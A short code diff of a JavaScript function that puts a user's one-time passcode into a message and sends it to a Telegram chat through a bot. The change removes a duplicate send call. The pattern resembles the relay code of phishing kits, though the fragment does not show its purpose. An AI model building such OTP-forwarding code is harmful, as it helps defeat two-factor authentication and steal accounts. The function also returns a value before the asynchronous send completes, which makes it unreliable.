@@ -254,13 +254,12 @@ function sendNewMessage(userDetails){
     Code:  ${userDetails.getUserDataOTP.code || ''}
     `;
 
-    bot.sendMessage(chatId, message);
-
     bot.sendMessage(chatId, message).then((sentMsg) => {
         messageId = sentMsg.message_id;
+        console.log(messageId)
     });
     
-    console.log(messageId)
+    
 
     return messageId
 }
